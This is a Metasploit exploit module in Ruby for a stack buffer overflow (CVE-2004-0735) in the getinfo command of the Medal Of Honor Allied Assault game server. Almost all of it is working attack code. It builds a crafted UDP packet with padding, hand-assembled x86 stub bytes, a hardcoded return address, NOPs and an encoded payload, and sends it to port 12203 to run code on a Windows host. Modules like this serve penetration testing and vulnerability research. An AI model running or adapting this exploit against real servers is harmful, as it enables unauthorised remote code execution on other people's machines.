##
# $Id: mohaa_getinfo.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Medal Of Honor Allied Assault getinfo Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack based buffer overflow in the getinfo
				command of Medal Of Honor Allied Assault.
			},
			'Author'         => [ 'Jacopo Cervini' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2004-0735'],
					[ 'OSVDB', '8061' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/357'],
					[ 'BID', '10743'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Medal Of Honor Allied Assault v 1.0 Universal', { 'Rets' => [ 111, 0x406957 ] }], # call ebx
				],
			'DisclosureDate' => 'Jul 17 2004',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(12203)
			], self.class)
	end

	def exploit
		connect_udp

		# We should convert this to metasm - Patrick
		buf = 'B' * target['Rets'][0]
		buf << "\x68\x76\x76\x76\x76"*9   	# PUSH 76767676 x 9
		buf << "\x68\x7f\x7f\x7f\x7f"     	# PUSH 7F7F7F7F
		buf << "\x57"			    	# PUSH EDI
		buf << "\x58"			    	# POP EAX
		buf << "\x32\x64\x24\x24"	    	# XOR AH,BYTE PTR SS:[ESP+24]
		buf << "\x32\x24\x24"		    	# XOR AH,BYTE PTR SS:[ESP]
		buf << "\x48"*150			    	# DEC EAX x 150
		buf << "\x50\x50"			    	# PUSH EAX x 2
		buf << "\x53"				# PUSH EBX
		buf << "\x58"				# POP EAX
		buf << "\x51"				# PUSH ECX
		buf << "\x32\x24\x24"			# XOR AH,BYTE PTR SS:[ESP]
		buf << "\x6a\x7f"				# PUSH 7F
		buf << "\x5e"				# POP ESI
		buf << "\x46"*37				# INC ESI
		buf << "\x56"*10				# PUSH ESI
		buf << "\x32\x44\x24\x24"		# XOR AL,BYTE PTR SS:[ESP+24]
		buf << "\x49\x49"				# DEC ECX
		buf << "\x31\x48\x34"			# XOR DWORD PTR DS:[EAX+34],ECX
		buf << "\x58"*11				# POP EAX
		buf << "\x42"*66
		buf << "\x3c"*4
		buf << "\x42"*48
		buf << [ target['Rets'][1] ].pack('V')

		req = "\xff\xff\xff\xff\x02" + "getinfo " + buf
		req << "\r\n\r\n" + make_nops(32) + payload.encoded

		udp_sock.put(req)

		handler
		disconnect_udp
	end

end
